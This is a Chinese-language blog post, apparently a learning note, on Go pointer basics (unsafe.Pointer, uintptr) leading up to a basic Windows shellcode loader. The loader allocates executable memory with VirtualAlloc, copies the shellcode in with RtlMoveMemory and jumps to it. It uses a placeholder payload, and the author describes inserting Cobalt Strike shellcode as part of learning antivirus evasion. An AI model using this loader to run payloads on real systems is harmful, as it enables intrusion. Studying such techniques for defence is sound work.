@@ -1,0 +1,591 @@
+<!DOCTYPE html>
+<html lang="zh-CN" color-mode="light">
+
+  <head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <meta name="author" content="stoocea" />
+  <!-- Open Graph Description 简短摘要-->
+  
+  <!-- 用于搜索引擎的文章摘要 -->
+  
+  <meta name="description" content="time thicking away" />
+  
+  
+  
+  <title>
+    
+      Go-shellCode加载器 
+      
+      
+      |
+    
+     stoocea&#39;s blog
+  </title>
+
+  
+    <link rel="apple-touch-icon" href="/images/favicon.png">
+    <link rel="icon" href="/images/favicon.png">
+  
+
+  <!-- Raleway-Font -->
+  <link href="https://fonts.googleapis.com/css?family=Raleway&display=swap" rel="stylesheet">
+
+  <!-- hexo site css -->
+  <link rel="stylesheet" href="/css/main.css" />
+  <link rel="stylesheet" href="//at.alicdn.com/t/font_1886449_67xjft27j1l.css" />
+  <!-- 代码块风格 -->
+  
+    
+<link rel="stylesheet" href="/css/figcaption/mac-block.css">
+
+  
+
+  <!-- jquery3.3.1 -->
+  
+    <script defer type="text/javascript" src="/plugins/jquery.min.js"></script>
+  
+
+  <!-- fancybox -->
+  
+    <link href="/plugins/jquery.fancybox.min.css" rel="stylesheet">
+    <script defer type="text/javascript" src="/plugins/jquery.fancybox.min.js"></script>
+  
+  
+<script src="/js/fancybox.js"></script>
+
+
+  
+
+  
+
+  <script>
+    var html = document.documentElement
+    const colorMode = localStorage.getItem('color-mode')
+    if (colorMode) {
+      document.documentElement.setAttribute('color-mode', colorMode)
+    }
+  </script>
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+  <body>
+    <div id="app">
+      <div class="header">
+  <div class="avatar">
+    <a href="/">
+      <!-- 头像取消懒加载，添加no-lazy -->
+      
+        <img src="/images/4DF91FDE2543D52C6A4B04B2C784E859.png" alt="">
+      
+    </a>
+    <div class="nickname"><a href="/">stoocea</a></div>
+  </div>
+  <div class="navbar">
+    <ul>
+      
+        <li class="nav-item" data-path="/">
+          <a href="/">Home</a>
+        </li>
+      
+        <li class="nav-item" data-path="/archives/">
+          <a href="/archives/">Archives</a>
+        </li>
+      
+        <li class="nav-item" data-path="/tags/">
+          <a href="/tags/">Tags</a>
+        </li>
+      
+        <li class="nav-item" data-path="/friends/">
+          <a href="/friends/">Friends</a>
+        </li>
+      
+        <li class="nav-item" data-path="/about/">
+          <a href="/about/">About</a>
+        </li>
+      
+    </ul>
+  </div>
+</div>
+
+
+<script src="/js/activeNav.js"></script>
+
+
+
+      <div class="flex-container">
+        <!-- 文章详情页，展示文章具体内容，url形式：https://yoursite/文章标题/ -->
+<!-- 同时为「标签tag」，「朋友friend」，「分类categories」，「关于about」页面的承载页面，具体展示取决于page.type -->
+
+
+  <!-- LaTex Display -->
+
+  
+    <script async type="text/javascript" src="/plugins/mathjax/tex-chtml.js"></script>
+  
+  <script>
+    MathJax = {
+      tex: {
+        inlineMath: [['$', '$'], ['\\(', '\\)']]
+      }
+    }
+  </script>
+
+
+
+
+
+  <!-- clipboard -->
+
+  
+    <script async type="text/javascript" src="/plugins/clipboard.min.js"></script>
+  
+  
+<script src="/js/codeCopy.js"></script>
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  <!-- 文章内容页 url形式：https://yoursite/文章标题/ -->
+  <div class="container post-details" id="post-details">
+    <div class="post-content">
+      <div class="post-title">Go-shellCode加载器</div>
+      <div class="post-attach">
+        <span class="post-pubtime">
+          <i class="iconfont icon-updatetime mr-10" title="更新时间"></i>
+          2025-01-17 11:51:29
+        </span>
+        
+              <span class="post-tags">
+                <i class="iconfont icon-tags mr-10" title="标签"></i>
+                
+                <span class="span--tag mr-8">
+                  <a href="/tags/golang-shellcodeLoader/" title="golang-shellcodeLoader">
+                    #golang-shellcodeLoader
+                  </a>
+                </span>
+                
+              </span>
+          
+      </div>
+      <div class="markdown-body">
+        <p>笔记属于记录恶意程序免杀入门学到的一些课程以及文章，主要用于记录和自我理解，程度很低。</p>
+<h1 id="0x01-unsafePointer指针基础"><a href="#0x01-unsafePointer指针基础" class="headerlink" title="0x01 unsafePointer指针基础"></a>0x01 unsafePointer指针基础</h1><p>首先是golang中的一些指针基础，在go中和C中取出某个变量的指针的符号是一样的–<code>&amp;</code>​，具体使用案例如下</p>
+<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line"></span><br><span class="line">	banner1 := <span class="string">&quot;stooceaTest&quot;</span></span><br><span class="line">	fmt.Printf(<span class="string">&quot;[*] %s\n&quot;</span>, banner1)</span><br><span class="line">	fmt.Printf(<span class="string">&quot;[*] %p\n&quot;</span>, &amp;banner1)  <span class="comment">//此时%p输出的是指向当前banner指针结构体的指针，并非指向该字符串变量所在内存的指针</span></span><br><span class="line">	fmt.Printf(<span class="string">&quot;[*] %s\n&quot;</span>, *&amp;banner1) <span class="comment">//解引用符号*, 只能使用在指针变量的左边，用于自动解析该指针变量指向的内存地址，并且将该变量内容带出</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">	</span><br><span class="line"></span><br><span class="line"><span class="comment">//============= 编译执行该go文件</span></span><br><span class="line"><span class="keyword">go</span> run main.<span class="keyword">go</span></span><br><span class="line">[*] stooceaTest</span><br><span class="line">[*] <span class="number">0xc00008a030</span></span><br><span class="line">[*] stooceaTest</span><br></pre></td></tr></table></figure>
+
+<p>每个变量其实都是一个结构体，例如字符串变量，实际上他里面就是一段指针–用于指向该字符串内存位置;然后还有一块内容用于存储长度。我们可以根据这段指针指向和长度，无差错的获取到这段字符串内容。</p>
+<p>‍</p>
+<h1 id="0x02-unsafe-package"><a href="#0x02-unsafe-package" class="headerlink" title="0x02 unsafe package"></a>0x02 unsafe package</h1><h2 id="1x01-Unsafe-Pointer"><a href="#1x01-Unsafe-Pointer" class="headerlink" title="1x01 Unsafe.Pointer"></a>1x01 Unsafe.Pointer</h2><p>unsafe包在各种语言中都有见到过，根据他名字就能看出来，这个包下面的一些用法会涉及到底层操作甚至是一些不安全的操作。比如说将任意的指针转化为通用类型的指针</p>
+<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;fmt&quot;</span></span><br><span class="line">	<span class="string">&quot;unsafe&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line"></span><br><span class="line">	banner1 := <span class="string">&quot;stooceaTest&quot;</span></span><br><span class="line">	fmt.Printf(<span class="string">&quot;[*] %s\n&quot;</span>, banner1)</span><br><span class="line">	fmt.Printf(<span class="string">&quot;[*] %p\n&quot;</span>, &amp;banner1)  <span class="comment">//此时%p输出的是指向当前banner指针结构体的指针，并非指向该字符串变量所在内存的指针</span></span><br><span class="line">	fmt.Printf(<span class="string">&quot;[*] %s\n&quot;</span>, *&amp;banner1) <span class="comment">//解引用符号*, 只能使用在指针变量的左边，用于自动解析该指针变量指向的内存地址，并且将该变量内容带出</span></span><br><span class="line"></span><br><span class="line">	fmt.Printf(<span class="string">&quot;[*] %T\n&quot;</span>, unsafe.Pointer(&amp;banner1))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>然后其实go中的函数也能够直接进行的参数的传递，这里我们演示三种修改函数解引用后的指针的方法，分别为</p>
+<p>1.参数直接传递</p>
+<p>2.通过修改对应解引用后的内存地址实现函数变量的内容修改</p>
+<p>3.套一层unsafe的pointer操作，依然实现解引用后地址的赋值</p>
+<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;fmt&quot;</span></span><br><span class="line">	<span class="string">&quot;unsafe&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">demo2</span><span class="params">()</span></span> &#123;</span><br><span class="line">	fmt.Println(<span class="string">&quot;AN94ing&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="comment">//最为简单的函数直接传参之后调用</span></span><br><span class="line">	testfunc := <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;&#125;</span><br><span class="line">	testfunc = demo2</span><br><span class="line">	testfunc()</span><br><span class="line"></span><br><span class="line">	<span class="comment">//改变testfunc2的指针指向demo2函数指针的所对应的值，达到函数修改的目的</span></span><br><span class="line">	testfunc2 := <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;&#125;</span><br><span class="line">	demo2func := demo2</span><br><span class="line"></span><br><span class="line">	*&amp;testfunc2 = *&amp;demo2func</span><br><span class="line">	testfunc2()</span><br><span class="line">	<span class="comment">//结果不同，因为此时&amp;testfunc2和&amp;demo2func分别属于指向各自变量的结构体指针</span></span><br><span class="line">	fmt.Printf(<span class="string">&quot;%p\n&quot;</span>, &amp;testfunc2)</span><br><span class="line">	fmt.Printf(<span class="string">&quot;%p\n&quot;</span>, &amp;demo2func)</span><br><span class="line"></span><br><span class="line">	<span class="comment">//此时解引用之后地址值相同，同样都是关于demo2函数内容在内存中的地址</span></span><br><span class="line">	fmt.Printf(<span class="string">&quot;%p\n&quot;</span>, *&amp;testfunc2)</span><br><span class="line">	fmt.Printf(<span class="string">&quot;%p\n&quot;</span>, *&amp;demo2func)</span><br><span class="line"></span><br><span class="line">	<span class="comment">//通过unsafe的pointer函数额外的去套一层实现testfunc3和demo2func两者结构体中的指针都等于demo2func在内存中的指针</span></span><br><span class="line">	testfunc3 := <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//由于unsafe包下调用Pointer方法修改后的通用指针不能够被直接使用，所以只能将其转化为正常的对应类型的指针，然后才能解引用</span></span><br><span class="line">	*(*<span class="function"><span class="keyword">func</span><span class="params">()</span></span>)(unsafe.Pointer(&amp;testfunc3)) = *(*<span class="function"><span class="keyword">func</span><span class="params">()</span></span>)(unsafe.Pointer(&amp;demo2func))</span><br><span class="line">	fmt.Printf(<span class="string">&quot;%p\n&quot;</span>, &amp;testfunc3)</span><br><span class="line">	fmt.Printf(<span class="string">&quot;%p\n&quot;</span>, &amp;demo2func)</span><br><span class="line">	fmt.Printf(<span class="string">&quot;%p\n&quot;</span>, *&amp;testfunc3)</span><br><span class="line">	fmt.Printf(<span class="string">&quot;%p\n&quot;</span>, *&amp;demo2func)</span><br><span class="line">	testfunc3()</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>这里注意两点，一是如果想要直接解引用demo2的地址值，必须要先将其赋值为一个变量才能通过&amp;将对应结构体指针取出并解引用。</p>
+<p>二是unsafe包下调用Pointer方法修改后的通用指针不能够被直接使用，所以只能将其转化为正常的对应类型的指针，然后才能解引用</p>
+<p>‍</p>
+<h3 id="uintptr"><a href="#uintptr" class="headerlink" title="uintptr"></a>uintptr</h3><p>有两层含义，uintptr在Go的unsafe包下实际上是一段方法。而实际上，uintptr在各类变量的实际结构体中，就是那段指针的值。</p>
+<p>简单来说，我们之前提到的banner字符串，它实际上是一段结构体，最开始我们说这个结构体里面存有一段指针-用来指向实际字符串内容在内存中的地址；还有一个具体的值用来代表这个字符串的实际长度，便于读取时知道大概要读取多少长度。而现在，这个用来指向实际字符串内容的内存地址指针，它本质上就是一段uintptr。</p>
+<p>所以uintptr本质也是一段值。在32位的系统中是4字节，在64位系统中是8字节。进一步展开来讲，当我们想修改某个变量的值时，也要将修改对象的值转化为uintptr类型，因为只有同类型才能赋值转化。</p>
+<p>用例代码：</p>
+<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;fmt&quot;</span></span><br><span class="line">	<span class="string">&quot;unsafe&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">demo2</span><span class="params">()</span></span> &#123;</span><br><span class="line">	fmt.Println(<span class="string">&quot;AN94ing&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line"></span><br><span class="line">	banner1 := <span class="string">&quot;stooceaTest&quot;</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">//uintptr的使用</span></span><br><span class="line">	fmt.Printf(<span class="string">&quot;[*] %d\n&quot;</span>, (<span class="type">uintptr</span>(unsafe.Pointer(&amp;banner1))))</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//输出</span></span><br><span class="line">[*] <span class="number">824634810144</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h4 id="uintptr特点以及作用"><a href="#uintptr特点以及作用" class="headerlink" title="uintptr特点以及作用"></a>uintptr特点以及作用</h4><p>上面铺垫了一些东西，总的来说我们就为了一个目的–取出变量结构体中的那个uintptr。如何操作呢？我们可以先建立一个指针，用于指向这个变量的结构体。$var1就能够解决。最开始在uintptr中我们又提到：uintptr在32位系统中是4个字节，在64位系统中是8字节。所以现在这个指针往后连续读8位就能够读取到这个uintptr</p>
+<p>不过这么做实属有些麻烦，我们可以定义一个uinptr类型的指针，或者说我们将该结构体指针强转为uintptr的指针，然后再对其解引用。而解引用之后的值又必然是原来的这个指针类型的值，所以解引用之后就是一段uintptr，也就是该结构体的uintptr。</p>
+<p>实例代码：</p>
+<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;fmt&quot;</span></span><br><span class="line">	<span class="string">&quot;unsafe&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">demo2</span><span class="params">()</span></span> &#123;</span><br><span class="line">	fmt.Println(<span class="string">&quot;AN94ing&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line"></span><br><span class="line">	banner1 := <span class="string">&quot;stooceaTest&quot;</span></span><br><span class="line">	<span class="comment">//获取到任意变量的uintptr</span></span><br><span class="line">	stringstructureUintptr := *(*<span class="type">uintptr</span>)(unsafe.Pointer(&amp;banner1))</span><br><span class="line">	fmt.Printf(<span class="string">&quot;[*] %d\n&quot;</span>, stringstructureUintptr)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//输出</span></span><br><span class="line">[*] <span class="number">11369396</span></span><br></pre></td></tr></table></figure>
+
+<p>当我们可以获取到这个变量的uintptr之后就能够实现一部分值转化的功能：</p>
+<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;fmt&quot;</span></span><br><span class="line">	<span class="string">&quot;unsafe&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">demo2</span><span class="params">()</span></span> &#123;</span><br><span class="line">	fmt.Println(<span class="string">&quot;AN94ing&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//uintptr的使用</span></span><br><span class="line">	banner1 := <span class="string">&quot;Testbanner1&quot;</span></span><br><span class="line">	banner2 := <span class="string">&quot;stoocea&quot;</span></span><br><span class="line">	fmt.Printf(<span class="string">&quot;[*] %d\n&quot;</span>, (<span class="type">uintptr</span>(unsafe.Pointer(&amp;banner1))))</span><br><span class="line"></span><br><span class="line">	*(*<span class="type">uintptr</span>)(unsafe.Pointer(&amp;banner2)) = *(*<span class="type">uintptr</span>)(unsafe.Pointer(&amp;banner1))</span><br><span class="line"></span><br><span class="line">	fmt.Println(banner2)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//输出</span></span><br><span class="line">Testban</span><br></pre></td></tr></table></figure>
+
+<p>为什么说是一部分的值转化呢？其实到这里也能够看明白了，banner2仅仅只是把uintptr的值给拿过来了，但是banner1结构体中的len还没有存过来，导致长度只能截取到stoocea字符串同样长度的banner1值–Testban。</p>
+<p>当然，如果两者的值不同，会报错unexpected fault address。说明类型还是有检测的</p>
+<p>‍</p>
+<p>‍</p>
+<h1 id="0x03-ShellCode-Loader"><a href="#0x03-ShellCode-Loader" class="headerlink" title="0x03 ShellCode Loader"></a>0x03 ShellCode Loader</h1><blockquote>
+<p>shellcode的本质其实就是一段可以自主运行的机器码，它没有任何文件结构，它不依赖任何编译环境，无法像exe一样双击运行，因此需要通过控制程序流程跳转到shellcode地址加载上去执行shellcode</p>
+</blockquote>
+<p>这也是为什么我们需要shellcodeLoader的原因。结合上面的基础，我们可以通过一个go的shellcodeLoader的样例代码进行分析：</p>
+<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;encoding/hex&quot;</span></span><br><span class="line">	<span class="string">&quot;syscall&quot;</span></span><br><span class="line">	<span class="string">&quot;unsafe&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> (</span><br><span class="line">	kernel32      = syscall.NewLazyDLL(<span class="string">&quot;kernel32.dll&quot;</span>)</span><br><span class="line">	VirtualAlloc  = kernel32.NewProc(<span class="string">&quot;VirtualAlloc&quot;</span>)</span><br><span class="line">	RtlMoveMemory = kernel32.NewProc(<span class="string">&quot;RtlMoveMemory&quot;</span>)</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">build</span><span class="params">(ddm <span class="type">string</span>)</span></span> &#123;</span><br><span class="line">	sDec, _ := hex.DecodeString(ddm)</span><br><span class="line">	addr, _, _ := VirtualAlloc.Call(<span class="number">0</span>, <span class="type">uintptr</span>(<span class="built_in">len</span>(sDec)), <span class="number">0x1000</span>|<span class="number">0x2000</span>, <span class="number">0x40</span>)</span><br><span class="line">	_, _, _ = RtlMoveMemory.Call(addr, (<span class="type">uintptr</span>)(unsafe.Pointer(&amp;sDec[<span class="number">0</span>])), <span class="type">uintptr</span>(<span class="built_in">len</span>(sDec)))</span><br><span class="line">	syscall.Syscall(addr, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	payload := <span class="string">&quot;test&quot;</span></span><br><span class="line">	build(payload)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>除去其他的加解密混淆等免杀手段，一个shellcodeloader需要这么多内容。大致可以分为:完成内存申请，写入shellcode，导流程序执行shellcode这3个部分。</p>
+<p>我们一个一个来看。完成内存申请的部分我们有很多方式可以实现，windows中也提供了很多的API来实现内存分配：HeapAlloc，malloc，VirtualAlloc，new，LocalAlloc…..。</p>
+<p>调用这些API申请内存的时候都需要申明这块内存的基本信息：申请的内存大小，申请内存的起始基址，申请的内存属性，申请内存对外权限等。这些我们在shellcodeLoader的示例代码中就能够看到，调用VirtualAlloc.Call时的参数就是具体的内存参数。</p>
+<p>其实上述的分配内存API都会用到VirtualAlloc，因为VirtualAlloc申请的单位是“页”，windows管理内存的基本单位就是页。</p>
+<p>了解上述基础之后再来具体看loader关键的内容</p>
+<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> (</span><br><span class="line">	<span class="comment">// VirtualAlloc这个函数在kernel32.dll中，我们先懒加载导入这个动态链接库，只有kernel32.dll中的函数被使用时才会真正加载它</span></span><br><span class="line">	kernel32      = syscall.NewLazyDLL(<span class="string">&quot;kernel32.dll&quot;</span>)</span><br><span class="line">	<span class="comment">//获取VirtualAlloc的句柄，便于后续调用VirtualAlloc</span></span><br><span class="line">	VirtualAlloc  = kernel32.NewProc(<span class="string">&quot;VirtualAlloc&quot;</span>)</span><br><span class="line">	<span class="comment">//RtlMoveMemory主要是用来拷贝内存的，专门为windows设计，类似于标准库中的memcpy。</span></span><br><span class="line">	RtlMoveMemory = kernel32.NewProc(<span class="string">&quot;RtlMoveMemory&quot;</span>)</span><br><span class="line">)</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">build</span><span class="params">(ddm <span class="type">string</span>)</span></span> &#123;</span><br><span class="line">	<span class="comment">//我们用CS生成的shellcode如果使用C模式的话就会生成一段HEX数据，最原始的shellcode用hex解码即可</span></span><br><span class="line">	sDec, _ := hex.DecodeString(ddm)</span><br><span class="line">	<span class="comment">//调用VirtualAlloc函数进行内存分配，参数从左至右分别是：内存基址(为0的话就会自动查找)，内存写入长度，分配类型，内存权限（0x40表示可执行权限）</span></span><br><span class="line">	<span class="comment">//返回值为起始地址</span></span><br><span class="line">	addr, _, _ := VirtualAlloc.Call(<span class="number">0</span>, <span class="type">uintptr</span>(<span class="built_in">len</span>(sDec)), <span class="number">0x1000</span>|<span class="number">0x2000</span>, <span class="number">0x40</span>)</span><br><span class="line">	<span class="comment">//进行内存写入，这里主要是第二个参数，将我们真正想要写入内存的数据作为参数传入</span></span><br><span class="line">	_, _, _ = RtlMoveMemory.Call(addr, (<span class="type">uintptr</span>)(unsafe.Pointer(&amp;sDec[<span class="number">0</span>])), <span class="type">uintptr</span>(<span class="built_in">len</span>(sDec)))</span><br><span class="line">	<span class="comment">//调用</span></span><br><span class="line">	syscall.Syscall(addr, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>做一个演示，首先用CS生成一段payload，然后将他的shellcode提取出来存入payload，之后就会根据我们上述分析的逻辑一样，系统会去执行这段内存中的指令（具体shellcode里面是什么，其实我本身也很好奇，只不过具体是怎么样还得等后续分析）</p>
+<p><img src="/images/goshellcodeloader/assets/image-20250117094132-qscme2h.png" alt="image">​</p>
+<p><img src="/images/goshellcodeloader/assets/image-20250117094644-jbx4ske.png" alt="image">​</p>
+<p>话又说话来，这一段内容其实很早就过时了，估计这段exe放到VT中都查的差不多了，主要还是意图过于明显，VirtualAlloc本身就是一个很敏感的操作。况且我也没有对payload进行混淆处理。算是很基本的shellcodeloader。</p>
+<p>‍</p>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>这篇笔记是参考B站清风拂月师傅的视频边学边记录的，也加上了自己的一些理解和扩展。不过这篇文章的内容就到这了，在往深我就才疏学浅了。算是给我自己半只脚入个门，后面会持续学习一些基本功和进一步的免杀。</p>
+<p>‍</p>
+<p>‍</p>
+
+      </div>
+      
+        <div class="prev-or-next">
+          <div class="post-foot-next">
+            
+              <a href="/post/GodZilla%E5%8A%9F%E8%83%BD%E5%88%86%E6%9E%90%E5%8F%8A%E5%AD%A6%E4%B9%A0.html" target="_self">
+                <i class="iconfont icon-chevronleft"></i>
+                <span>上一页</span>
+              </a>
+            
+          </div>
+          <div class="post-attach">
+            <span class="post-pubtime">
+              <i class="iconfont icon-updatetime mr-10" title="更新时间"></i>
+              2025-01-17 11:51:29
+            </span>
+            
+                  <span class="post-tags">
+                    <i class="iconfont icon-tags mr-10" title="标签"></i>
+                    
+                    <span class="span--tag mr-8">
+                      <a href="/tags/golang-shellcodeLoader/" title="golang-shellcodeLoader">
+                        #golang-shellcodeLoader
+                      </a>
+                    </span>
+                    
+                  </span>
+              
+          </div>
+          <div class="post-foot-prev">
+            
+          </div>
+        </div>
+      
+    </div>
+    
+  <div id="btn-catalog" class="btn-catalog">
+    <i class="iconfont icon-catalog"></i>
+  </div>
+  <div class="post-catalog hidden" id="catalog">
+    <div class="title">目录</div>
+    <div class="catalog-content">
+      
